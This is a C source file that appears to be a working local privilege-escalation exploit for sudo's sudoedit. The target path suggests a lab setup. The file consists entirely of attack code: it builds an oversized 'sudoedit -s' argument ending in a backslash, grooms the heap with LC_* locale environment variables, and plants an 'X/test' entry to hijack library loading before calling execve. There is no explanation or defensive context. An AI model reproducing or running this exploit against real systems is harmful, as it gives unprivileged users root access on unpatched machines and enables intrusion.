//gcc -o exploit exp.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
/*
#define LC_CTYPE          __LC_CTYPE	0
#define LC_NUMERIC        __LC_NUMERIC	1
#define LC_TIME           __LC_TIME	2
#define LC_COLLATE        __LC_COLLATE	3
#define LC_MONETARY       __LC_MONETARY	4
#define LC_MESSAGES       __LC_MESSAGES	5
#define	LC_ALL		  __LC_ALL	6
#define LC_PAPER	  __LC_PAPER	7	
#define LC_NAME		  __LC_NAME	8
#define LC_ADDRESS	  __LC_ADDRESS	9
#define LC_TELEPHONE	  __LC_TELEPHONE	10
#define LC_MEASUREMENT	  __LC_MEASUREMENT	11
#define LC_IDENTIFICATION __LC_IDENTIFICATION	12
*/

#define target_path "/home/pwn/sudo/bin/sudoedit"

char *lc_name[] ={"LC_CTYPE", 
		"LC_NUMERIC", 
		"LC_TIME", 
		"LC_COLLATE", 
		"LC_MONETARY", 
		"LC_MESSAGES", 
		"LC_ALL", 
		"LC_PAPER", 
		"LC_NAME",
		"LC_ADDRESS",
		"LC_TELEPHONE",
		"LC_MEASUREMENT",
		"LC_IDENTIFICATION"
		};
		
char *argv[300];
int argvnow = 0;

char *env[4096];
int envnow = 0;

int lc_name_count = 11;

void add(unsigned int size)
{
	argv[argvnow++] = "sudoedit";
	argv[argvnow++] = "-s";
	char *ptr = malloc(size);
	memset(ptr, 0, size);
	for( int i = 0; i < size - 0x10 - 1; i++)
		strcat(ptr, "z");
	strcat(ptr, "\\");
	argv[argvnow++] = ptr;	
	
	char *padding = malloc(0x6e0 - 0x90 + 0x10);
	for (int i = 0; i < 0x6e0 - 0x90 - 1; i++)
		strcat(padding, "b");
	strcat(padding, "\\");
	env[envnow++] = padding;
	
	
	for (int i = 0; i < 0x30; i++)
	{
		char *padding_zero = malloc(0x10);
		strcat(padding_zero, "\\");
		env[envnow++] = padding_zero;
	}
	
	char *name = malloc(0x20);
	strcat(name, "X/test");
	env[envnow++] = name;
	
	
}

void delete(unsigned int size)
{
	char *fixed = "=C.UTF-8@";
	unsigned int lc_name_size = strlen(lc_name[lc_name_count]);
	unsigned int fixed_size = strlen(fixed);
	unsigned int padding = size - lc_name_size - fixed_size;
	char * ptr = malloc(size + 0x10);
	memset(ptr, 0, size+0x10);
	strcat(ptr, lc_name[lc_name_count]);
	strcat(ptr, fixed);
	for (unsigned int i = 0; i < padding - 8; i++)
		strcat(ptr, "a");
	env[envnow++] = ptr;
	lc_name_count--;
}

void delete_error()
{
	char * ptr = malloc(0x100);
	strcat(ptr, lc_name[lc_name_count]);
	strcat(ptr, "=XXXXXX");
	env[envnow++] = ptr;
	lc_name_count--;
}


int main()
{
	add(0xa0);
	delete(0x40);
	delete(0x40);
	delete(0xa0);
	delete(0x40);
	
	
	delete_error();
	execve(target_path,argv,env);
	
}

